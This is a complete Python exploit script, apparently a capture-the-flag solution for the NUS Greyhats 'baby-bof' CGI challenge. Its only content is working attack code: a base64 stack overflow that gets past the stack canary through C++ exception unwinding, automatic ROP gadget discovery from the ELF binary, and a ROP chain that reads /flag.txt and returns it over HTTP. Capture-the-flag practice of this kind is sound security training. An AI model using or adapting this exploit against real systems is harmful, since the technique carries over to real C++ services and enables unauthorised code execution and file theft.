#!/usr/bin/env python3
"""
Final exploit for NUS Greyhats baby-bof.

Bug: unbounded custom base64 decoder overflows validate_auth()'s local
`decoded[0x100]` buffer.  A normal ret2rop is blocked by stack canary, so the
payload corrupts saved RIP and then appends an invalid base64 character.  The
invalid character throws std::invalid_argument *after* the overflow is written.
C++ stack unwinding then uses our corrupted saved RIP as an unwind call-site and
pivots into a ROP chain in the decoded stack buffer.

The ROP writes a valid CGI header, opens /flag.txt, reads it, writes it to
stdout, then calls _exit(0), preventing lighttpd from returning 500.
"""
from __future__ import annotations

import argparse
import base64
import os
import pathlib
import re
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
from dataclasses import dataclass, replace
from typing import Dict, Iterable, List, Optional, Tuple

OFF_SAVED_RBP = 0x110
OFF_SAVED_RIP = 0x118
OFF_ROP       = 0x158
FLAG_RE = re.compile(rb"(?:grey|flag|ctf|nusgreyhats)\{[^}\r\n\x00]{1,200}\}", re.I)


def p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xffffffffffffffff)


@dataclass
class Config:
    pop_rdi: int
    pop_rsi: int
    pop_rdx_rbx: int
    open_addr: int
    read_addr: int
    write_addr: int
    exit_addr: int
    path_flag: int
    header: int
    bss: int
    fake_rbp: int
    unwind_rips: Tuple[int, ...]


# Works for the source-built binary in the challenge Docker image / normal
# Debian static build.  The script will still prefer extracting addresses from
# an ELF when possible.
FALLBACK = Config(
    pop_rdi=0x402514,
    pop_rsi=0x401cde,
    pop_rdx_rbx=0x482677,
    open_addr=0x44dfe0,
    read_addr=0x44e070,
    write_addr=0x44e0b0,
    exit_addr=0x44d6f0,
    path_flag=0x490131,
    header=0x4900fb,
    bss=0x4ca760,
    fake_rbp=0x4caf60,
    unwind_rips=(0x4086e0, 0x4086dc, 0x4086df),
)


class ELF:
    def __init__(self, path: pathlib.Path):
        self.path = path
        self.data = path.read_bytes()
        if self.data[:4] != b"\x7fELF" or self.data[4] != 2 or self.data[5] != 1:
            raise ValueError(f"{path} is not a little-endian ELF64 file")
        self.phdrs = self._parse_phdrs()
        self.symbols = self._load_symbols()

    def _parse_phdrs(self):
        e_phoff = struct.unpack_from("<Q", self.data, 0x20)[0]
        e_phentsize = struct.unpack_from("<H", self.data, 0x36)[0]
        e_phnum = struct.unpack_from("<H", self.data, 0x38)[0]
        out = []
        for i in range(e_phnum):
            o = e_phoff + i * e_phentsize
            p_type, p_flags = struct.unpack_from("<II", self.data, o)
            p_offset, p_vaddr = struct.unpack_from("<QQ", self.data, o + 8)
            p_filesz = struct.unpack_from("<Q", self.data, o + 32)[0]
            out.append((p_type, p_flags, p_offset, p_vaddr, p_filesz))
        return out

    def off_to_vaddr(self, off: int) -> int:
        for p_type, _flags, p_off, p_va, p_size in self.phdrs:
            if p_type == 1 and p_off <= off < p_off + p_size:
                return p_va + off - p_off
        raise ValueError(f"file offset {off:#x} is not mapped")

    def vaddr_to_off(self, va: int) -> int:
        for p_type, _flags, p_off, p_va, p_size in self.phdrs:
            if p_type == 1 and p_va <= va < p_va + p_size:
                return p_off + va - p_va
        raise ValueError(f"vaddr {va:#x} is not mapped")

    def executable_ranges(self):
        for p_type, flags, p_off, p_va, p_size in self.phdrs:
            if p_type == 1 and (flags & 1):
                yield p_off, p_off + p_size, p_va

    def _load_symbols(self) -> Dict[str, int]:
        if shutil.which("nm") is None:
            return {}
        res = subprocess.run(["nm", "-n", str(self.path)], text=True,
                             stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        syms: Dict[str, int] = {}
        for line in res.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 3 and re.fullmatch(r"[0-9a-fA-F]+", parts[0]):
                syms[parts[2]] = int(parts[0], 16)
        return syms

    def sym(self, *names: str) -> int:
        for name in names:
            if name in self.symbols:
                return self.symbols[name]
        raise KeyError("missing symbol: " + " / ".join(names))

    def find_vaddr(self, needle: bytes) -> int:
        off = self.data.find(needle)
        if off < 0:
            raise ValueError(f"could not find {needle!r}")
        return self.off_to_vaddr(off)

    def find_gadget(self, needle: bytes) -> int:
        best = None
        for start, end, va in self.executable_ranges():
            off = self.data.find(needle, start, end)
            if off >= 0:
                cand = va + off - start
                if best is None or cand < best:
                    best = cand
        if best is None:
            raise ValueError(f"missing gadget {needle.hex()}")
        return best

    def find_unwind_rip(self) -> int:
        # Useful return address in std::string::reserve(): after a call with a
        # catch landing pad that leaves rsp on attacker-controlled stack data.
        pat = b"\x31\xd2\x48\x89\xee\xe8"
        suffix = b"\x48\x8b\x13\x48\x8d\x7a\xe8"
        ranges = []
        if "_ZNSs7reserveEv" in self.symbols:
            ranges.append((self.vaddr_to_off(self.symbols["_ZNSs7reserveEv"]), 0x200))
        for start, end, _va in self.executable_ranges():
            ranges.append((start, end - start))
        for start, size in ranges:
            blob = self.data[start:start + size]
            idx = 0
            while True:
                j = blob.find(pat, idx)
                if j < 0:
                    break
                ret_off = start + j + 10
                if self.data[ret_off:ret_off + len(suffix)] == suffix:
                    return self.off_to_vaddr(ret_off)
                idx = j + 1
        if "_ZNSs7reserveEv" in self.symbols:
            start = self.vaddr_to_off(self.symbols["_ZNSs7reserveEv"])
            j = self.data[start:start + 0x200].find(pat)
            if j >= 0:
                return self.off_to_vaddr(start + j + 10)
        raise ValueError("could not auto-find unwind RIP; try --unwind-rip 0x4086e0")


def config_from_elf(path: pathlib.Path, unwind_override: Optional[int]) -> Config:
    elf = ELF(path)
    bss_start = elf.symbols.get("__bss_start", FALLBACK.bss)
    bss_end = elf.symbols.get("_end", bss_start + 0x8000)
    bss = (bss_start + min(0x4500, max(0x100, (bss_end - bss_start) // 2))) & ~0xf
    unwind = unwind_override if unwind_override is not None else elf.find_unwind_rip()
    return Config(
        pop_rdi=elf.find_gadget(b"\x5f\xc3"),
        pop_rsi=elf.find_gadget(b"\x5e\xc3"),
        pop_rdx_rbx=elf.find_gadget(b"\x5a\x5b\xc3"),
        open_addr=elf.sym("open", "__libc_open", "__open"),
        read_addr=elf.sym("read", "__libc_read", "__read"),
        write_addr=elf.sym("write", "__libc_write", "__write"),
        exit_addr=elf.sym("_exit"),
        path_flag=elf.find_vaddr(b"/flag.txt\x00"),
        header=elf.find_vaddr(b"Content-Type: text/plain\n"),
        bss=bss,
        fake_rbp=bss + 0x800,
        unwind_rips=(unwind,),
    )


def try_extract_with_docker(srcdir: pathlib.Path) -> Optional[pathlib.Path]:
    if shutil.which("docker") is None or not (srcdir / "Dockerfile").exists():
        return None
    tmp = pathlib.Path(tempfile.mkdtemp(prefix="baby_bof_extract_"))
    tag = "baby-bof-extract-local"
    print(f"[+] building Docker image from {srcdir}", file=sys.stderr)
    image = subprocess.check_output(["docker", "build", "-q", "-t", tag, str(srcdir)], text=True).strip()
    cid = subprocess.check_output(["docker", "create", image], text=True).strip()
    out = tmp / "index.cgi"
    try:
        subprocess.check_call(["docker", "cp", f"{cid}:/var/www/html/index.cgi", str(out)],
                              stdout=subprocess.DEVNULL)
    finally:
        subprocess.call(["docker", "rm", cid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"[+] extracted ELF: {out}", file=sys.stderr)
    return out


def try_compile_local(srcdir: pathlib.Path) -> Optional[pathlib.Path]:
    if shutil.which("g++") is None or not (srcdir / "index.cpp").exists():
        return None
    out = pathlib.Path(tempfile.mkdtemp(prefix="baby_bof_compile_")) / "index.cgi"
    print(f"[+] compiling local ELF from {srcdir / 'index.cpp'}", file=sys.stderr)
    subprocess.check_call([
        "g++", "-std=c++17", "-static", "-o", str(out),
        "-fstack-protector-strong", "-no-pie", str(srcdir / "index.cpp")
    ])
    return out


def find_elf(args) -> Optional[pathlib.Path]:
    if args.elf:
        return pathlib.Path(args.elf)
    dirs = []
    if args.docker_dir:
        p = pathlib.Path(args.docker_dir)
        # Common mistake: running inside dist-baby_bof and passing ./dist-baby_bof
        if not p.exists() and pathlib.Path("Dockerfile").exists():
            print(f"[!] {p} not found; using current directory instead", file=sys.stderr)
            p = pathlib.Path(".")
        dirs.append(p)
    else:
        dirs.append(pathlib.Path("."))
    for d in dirs:
        if (d / "index.cgi").exists():
            return d / "index.cgi"
        e = try_extract_with_docker(d)
        if e:
            return e
        e = try_compile_local(d)
        if e:
            return e
    return None


def rop_chain(c: Config) -> bytes:
    q: List[int] = []
    def write_fd1(addr: int, size: int) -> None:
        q.extend([c.pop_rdi, 1, c.pop_rsi, addr, c.pop_rdx_rbx, size, 0, c.write_addr])

    # Valid CGI response header. The rodata string has one newline, so write its
    # final newline one more time to form "\n\n".
    header_len = len(b"Content-Type: text/plain\n")
    write_fd1(c.header, header_len)
    write_fd1(c.header + header_len - 1, 1)

    # open('/flag.txt', O_RDONLY) -> fd 3, then read/write.
    q.extend([c.pop_rdi, c.path_flag, c.pop_rsi, 0, c.open_addr])
    q.extend([c.pop_rdi, 3, c.pop_rsi, c.bss, c.pop_rdx_rbx, 0x80, 0, c.read_addr])
    q.extend([c.pop_rdi, 1, c.pop_rsi, c.bss, c.pop_rdx_rbx, 0x80, 0, c.write_addr])
    q.extend([c.pop_rdi, 0, c.exit_addr])
    return b"".join(p64(x) for x in q)


def build_auth(c: Config, unwind_rip: int) -> str:
    raw = bytearray(b"A" * OFF_ROP + rop_chain(c))
    raw[:6] = b"admin:"
    raw[OFF_SAVED_RBP:OFF_SAVED_RBP + 8] = p64(c.fake_rbp)
    raw[OFF_SAVED_RIP:OFF_SAVED_RIP + 8] = p64(unwind_rip)
    # Avoid '=' padding, because padding is validated before all bytes are
    # decoded.  Then append '@' to throw after the overflow completed.
    while len(raw) % 3:
        raw += b"P"
    return "Basic " + base64.b64encode(raw).decode() + "@AAA"


def send_http(host: str, port: int, auth: str, timeout: float) -> bytes:
    req = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: baby-bof-final\r\n"
        f"Authorization: {auth}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(req)
        out = []
        while True:
            try:
                b = s.recv(4096)
            except socket.timeout:
                break
            if not b:
                break
            out.append(b)
    return b"".join(out)


def run_local_cgi(path: pathlib.Path, auth: str, timeout: float) -> bytes:
    env = os.environ.copy()
    env["HTTP_AUTHORIZATION"] = auth
    p = subprocess.run([str(path)], env=env, stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE, timeout=timeout)
    return p.stdout + (b"\n[stderr]\n" + p.stderr if p.stderr else b"")


def dump_config(c: Config) -> None:
    print("[+] exploit profile:", file=sys.stderr)
    for k in ["pop_rdi", "pop_rsi", "pop_rdx_rbx", "open_addr", "read_addr",
              "write_addr", "exit_addr", "path_flag", "header", "bss", "fake_rbp"]:
        print(f"    {k:12s} = {getattr(c, k):#x}", file=sys.stderr)
    print("    unwind_rips = " + ", ".join(f"{x:#x}" for x in c.unwind_rips), file=sys.stderr)


def parse_int(x: Optional[str]) -> Optional[int]:
    return None if x is None else int(x, 0)


def main() -> int:
    ap = argparse.ArgumentParser(description="Exploit baby-bof CGI stack overflow")
    ap.add_argument("host", nargs="?", default="challs.nusgreyhats.org")
    ap.add_argument("port", nargs="?", type=int, default=32367)
    ap.add_argument("--elf", help="use addresses from an existing index.cgi")
    ap.add_argument("--docker-dir", help="challenge directory containing Dockerfile/index.cpp; default: current dir")
    ap.add_argument("--no-auto-elf", action="store_true", help="use hardcoded fallback addresses")
    ap.add_argument("--local-cgi", help="run exploit against local CGI binary instead of TCP")
    ap.add_argument("--unwind-rip", help="override fake saved RIP, e.g. 0x4086e0")
    ap.add_argument("--timeout", type=float, default=5.0)
    ap.add_argument("--dump-auth", action="store_true")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    unwind_override = parse_int(args.unwind_rip)
    cfg = replace(FALLBACK, unwind_rips=(unwind_override,) if unwind_override else FALLBACK.unwind_rips)

    if not args.no_auto_elf:
        try:
            elf = find_elf(args)
            if elf is not None:
                cfg = config_from_elf(elf, unwind_override)
                if args.verbose:
                    print(f"[+] using ELF profile from {elf}", file=sys.stderr)
        except Exception as e:
            print(f"[!] ELF auto-profile failed: {e}; using fallback addresses", file=sys.stderr)

    if args.verbose:
        dump_config(cfg)

    last = b""
    for rip in cfg.unwind_rips:
        auth = build_auth(cfg, rip)
        if args.dump_auth:
            print(auth)
            return 0
        print(f"[+] trying unwind RIP {rip:#x}", file=sys.stderr)
        if args.local_cgi:
            resp = run_local_cgi(pathlib.Path(args.local_cgi), auth, args.timeout)
        else:
            resp = send_http(args.host, args.port, auth, args.timeout)
        last = resp
        m = FLAG_RE.search(resp)
        if m:
            print(m.group(0).decode(errors="replace"))
            return 0
        # Useful fallback: print body if our CGI header worked but regex missed.
        if b"500 Internal" not in resp and b"Content-Type: text/plain" in resp:
            sys.stdout.buffer.write(resp)
            return 0

    print("[-] no flag found; last response follows", file=sys.stderr)
    sys.stdout.buffer.write(last)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
